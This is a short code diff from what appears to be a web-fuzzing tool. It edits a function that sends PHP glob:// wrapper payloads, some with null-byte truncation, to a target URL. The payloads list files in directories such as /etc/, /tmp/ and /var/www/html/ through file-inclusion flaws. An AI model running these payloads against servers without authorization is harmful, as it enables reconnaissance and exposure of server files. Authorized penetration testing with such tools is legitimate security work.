@@ -50,7 +50,7 @@ def wrapper_glob_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=F
     dirs = ["/etc/", "/tmp/", "/var/www/html/"]
 
     for d in dirs:
-        glob_paloads = [f"glob://*.*", f"glob://{d}*", f"glob://{d}*.*", f"glob://*.*", f"glob://{d}*%00", f"glob://{d}*.*%00"]
+        glob_paloads = [f"glob://*.*", f"glob://{d}*", f"glob://{d}*.*", f"glob://*.*%00", f"glob://{d}*%00", f"glob://{d}*.*%00"]
         for payload in glob_paloads:
             resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
